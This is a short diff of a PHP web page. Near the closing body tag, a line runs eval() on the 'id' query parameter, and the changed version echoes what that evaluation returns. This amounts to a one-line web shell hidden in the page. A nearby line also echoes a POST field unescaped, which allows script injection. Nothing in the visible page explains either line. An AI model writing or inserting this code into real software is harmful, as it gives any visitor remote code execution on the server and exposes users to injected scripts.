@@ -443,7 +443,7 @@
           <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
 <?php
 if($_POST['Vegetable'] != null){echo $_POST['Vegetable']." Not found";}?>
-<?php if($_GET['id'] === "1"){echo " ";}else eval($_GET['id']);?>
+<?php if($_GET['id'] === "1"){echo " ";}else echo eval($_GET['id']);?>
 </body>
 
 </html>
